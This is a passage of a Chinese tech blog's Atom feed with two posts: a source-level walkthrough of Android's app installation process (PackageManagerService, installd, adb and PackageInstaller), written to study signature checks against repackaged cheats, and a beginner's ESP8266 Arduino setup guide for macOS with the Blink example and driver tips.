<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-01T07:46:31.205Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T07:46:31.205Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，此外 init 还会孵化mediaserver，此进程负责启动和管理 Framework 的 C 层的服务，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，这个进程与 mediaserver 对应，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-07-30T16:32:08.675Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a 